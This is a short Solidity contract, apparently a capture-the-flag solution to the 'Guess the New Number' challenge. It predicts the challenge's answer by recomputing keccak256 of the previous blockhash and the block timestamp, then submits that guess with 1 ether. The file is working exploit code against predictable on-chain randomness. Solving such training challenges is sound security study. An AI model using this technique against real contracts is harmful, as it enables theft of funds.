pragma solidity ^0.7.3;

interface GuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);

    function guess(uint8 n) external payable;
}

contract Gtnn_Exploit {
    GuessTheNewNumberChallenge gtnn;

    constructor(address _address) payable {
        require(msg.value == 1 ether);
        gtnn = GuessTheNewNumberChallenge(_address);
    }

    function exploit() public {
        uint8 ans = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        gtnn.guess{value: 1 ether}(ans);
    }

    receive() external payable {}
}
